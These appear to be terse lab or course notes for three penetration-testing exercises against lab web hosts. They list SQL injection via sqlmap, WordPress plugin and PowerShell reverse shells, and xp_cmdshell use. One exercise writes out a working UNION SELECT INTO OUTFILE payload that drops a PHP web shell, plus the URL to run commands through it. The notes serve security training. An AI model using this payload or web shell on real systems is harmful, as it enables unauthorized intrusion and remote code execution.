### 10.3.2.4

added the ip to /etc/hosts
scanned the website using wpscan
exploited sqli using sqlmap
uploaded reverse shell using wordpress plugin
got user as www-root
flag.txt in /var/www

### 10.3.2.5

email subscribe field in home page
boolean based sqli in post request with item mail-list
write php shell to file using sql injection
mail-list=' UNION SELECT null, null, null, null,"<?php echo system($_GET['cmd']);?>", null  INTO OUTFILE "/var/www/html/web1.php" -- //
http://forestsave.lab/web1.php?cmd=cat%20../flag.txt


### 10.3.2.7
SQLi in login 
xp_cmdshell working
uploaded powershell reverse shell and got reverse connection